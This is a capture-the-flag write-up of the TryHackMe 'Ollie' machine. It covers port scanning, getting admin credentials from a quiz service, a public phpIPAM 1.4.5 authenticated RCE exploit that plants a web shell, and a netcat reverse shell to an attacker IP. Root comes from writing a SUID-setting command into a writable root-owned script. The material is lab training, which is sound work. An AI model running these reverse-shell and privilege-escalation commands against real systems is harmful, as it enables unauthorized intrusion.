# Ollie - TryHackMe Writeup

**Difficulty:** Medium  
**TL;DR:** Credential leak → Authenticated RCE in phpIPAM 1.4.5 → privilege escalation 
---------------------------
## Target
- Machine: `ollie.thm`  
- Date: `2025-10-15`  
- Environment: TryHackMe / CTF
---------------------------

## Steps

---------------------------
## 1.Initial scan:

I began with an nmap scan to discover all open ports.

```bash
└─$ nmap -sS -Pn -T4 -p- ollie.thm

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
1337/tcp open  waste?
```
------------------------------
On the login page, I identified the application as **phpIPAM (IP Address Management) version 1.4.5**.

**About phpIPAM:**
> "phpipam is an open-source web IP address management application (IPAM). Its goal is to provide light, modern and useful IP address management."

 -------------------------------
## 2. Vulnerability Identification:

```bash
└─$ searchsploit phpIPAM 1.4.5  

phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated) | php/webapps/50963.py

```
The search revealed an authenticated Remote Code Execution (RCE) vulnerability in phpIPAM version 1.4.5. However,
valid credentials are required to exploit this vulnerability.
Initial attempts to obtain credentials included:
- SQL injection
- Directory enumeration 
- Brute force attacks (but got banned after several failed attempts)

-------------------------------
## 3. Credential Discovery via Port 1337

When initial attacks failed, I returned to investigate the unusual service on port 1337:

```bash
└─$ nc ollie.thm 1337

Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? 'ollie'
What's up, Ollie! It's been a while. What are you here for? '/admin'
Ya' know what? Ollie. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? 'Bulldog'
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: [REDACTED]!

PS: Good luck and next time bring some treats!
```
**Success!** The interactive service provided valid admin credentials after answering a simple quiz about Ollie's breed.
----------------------------------------

## 4. Exploitation and Initial Access

After successful authentication, I utilized **public exploit #50963** from Exploit-DB, which exploits a remote code execution vulnerability in phpIPAM 1.4.5.

```bash
└─$ python3 exploit.py -url http://ollie.thm -usr admin -pwd [REDACTED]! -cmd 'busybox nc [YOUR_IP] 4444 -e bash'

[...] Trying to log in as admin
[+] Login successful!
[...] Exploiting
[+] Success! The shell is located at http://ollie.thm/evil.php. Parameter: cmd

```
Reverse Shell Connection:
Simultaneously, a netcat listener was running, which successfully caught the reverse shell connection:
 
```bash
└─$ nc -lnvp 4444    
listening on [any] 4444 ...
connect to [YOUR_IP] from (UNKNOWN) [10.10.164.217] 57930
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-10-164-217:/var/www/html$ export TERM=xterm
export TERM=xterm
```
---------------------------------

## user.txt flag 

The `ollie` user account reused the same password discovered.

```bash
www-data@ollie.thm:/home$ su ollie
Password: 
ollie@ollie.thm:~$ id
uid=1000(ollie) gid=1000(ollie) groups=1000(ollie),4(adm),24(cdrom),30(dip),46(plugdev)
ollie@ollie.thm:~$ cat user.txt 
THM{[REDACTED]}
```
------------------------------------

## root.txt flag

Discovery of Writable Binary

Enumeration revealed a custom binary with unusual permissions:

```bash
ollie@ollie.thm:~$ find / -type f -user root -writable 2>/dev/null

/usr/bin/feedme

ollie@ollie.thm:~$ ls -la /usr/bin/feedme
-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
ollie@ollie.thm:~$ cat /usr/bin/feedme
#!/bin/bash

# This is weird?
```
The /usr/bin/feedme binary is owned by root but writable by the ollie user, presenting a privilege escalation vector.

Since the binary is executed by root (likely via cron job or SUID mechanism), I modified it to set the SUID bit on bash:

```bash
echo 'chmod +s /bin/bash ' > /usr/bin/feedme

ollie@ollie.thm:~$ /usr/bin/feedme
bash: /usr/bin/feedme: Permission denied
ollie@ollie.thm:~$ sudo /usr/bin/feedme
[sudo] password for ollie: 
ollie is not in the sudoers file.  This incident will be reported.
ollie@ollie.thm:~$ bash -p
bash-5.0# id
uid=1000(ollie) gid=1000(ollie) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(ollie)
bash-5.0# cat /root/root.txt 
THM{[REDACTED]}
```
